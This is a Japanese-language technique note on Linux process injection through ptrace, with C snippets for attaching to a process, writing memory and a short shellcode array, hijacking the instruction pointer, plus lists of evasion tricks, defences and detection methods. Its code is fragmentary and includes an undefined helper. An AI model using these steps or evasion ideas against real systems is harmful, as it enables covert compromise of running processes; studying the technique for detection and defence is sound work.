# Ptrace Process Injection

**対応OS**: Linux

## 概要
ptraceシステムコールを使用して、実行中のプロセスにコードを注入する手法です。

## 基本的な実装

### プロセスのアタッチ
```c
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>

// プロセスにアタッチ
if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) == -1) {
    perror("ptrace(ATTACH)");
    return -1;
}

// プロセスの停止を待機
waitpid(target_pid, NULL, 0);
```

### メモリの読み書き
```c
// メモリの読み取り
long read_data = ptrace(PTRACE_PEEKDATA, target_pid, 
    addr, NULL);

// メモリの書き込み
if (ptrace(PTRACE_POKEDATA, target_pid, 
    addr, data) == -1) {
    perror("ptrace(POKEDATA)");
    return -1;
}
```

### シェルコードの注入
```c
// レジスタの取得
struct user_regs_struct regs;
if (ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) == -1) {
    perror("ptrace(GETREGS)");
    return -1;
}

// シェルコードの書き込み
unsigned char shellcode[] = {
    0x48, 0x31, 0xc0,                   // xor rax, rax
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,  // mov rdi, 1
    0x48, 0xc7, 0xc6, 0x00, 0x00, 0x00, 0x00,  // mov rsi, 0
    0x48, 0xc7, 0xc2, 0x0c, 0x00, 0x00, 0x00,  // mov rdx, 12
    0x0f, 0x05                          // syscall
};

// シェルコードの書き込みとレジスタの設定
write_shellcode(target_pid, regs.rip, shellcode, sizeof(shellcode));
```

## 高度なテクニック

### メモリマップの取得
```c
void get_memory_map(pid_t pid)
{
    char maps_file[256];
    snprintf(maps_file, sizeof(maps_file), 
        "/proc/%d/maps", pid);
    
    FILE *fp = fopen(maps_file, "r");
    // メモリマップの解析
}
```

### コード実行
```c
// レジスタの設定
regs.rip = injection_addr;
if (ptrace(PTRACE_SETREGS, target_pid, NULL, &regs) == -1) {
    perror("ptrace(SETREGS)");
    return -1;
}

// プロセスの再開
ptrace(PTRACE_CONT, target_pid, NULL, NULL);
```

## 検知回避テクニック
- プロセス選択の工夫
- メモリパターンの偽装
- システムコールの分散
- タイミング制御

## 防御策
- ptraceの制限
- プロセスの保護
- メモリ領域の監視
- システムコールの監視

## 検知方法
- ptraceシステムコールの監視
- メモリ変更の検知
- プロセスの挙動分析
- システムコールトレース

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 